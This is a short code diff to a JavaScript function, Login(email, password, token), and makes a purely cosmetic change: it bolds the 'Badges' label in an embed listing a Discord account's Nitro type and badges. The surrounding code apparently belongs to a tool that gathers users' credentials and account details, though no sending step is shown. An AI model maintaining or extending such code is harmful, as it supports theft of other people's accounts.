@@ -159,7 +159,7 @@ function Login(email, password, token) {
                             "name": "**Other Info**",
                             "value": `**Nitro Type:** ${GetNitro(json.premium_type)}\n
                             
-                            Badges: ${GetBadges(json.flags)}`,
+                            **Badges:** ${GetBadges(json.flags)}`,
                             "inline": true
                         },
 
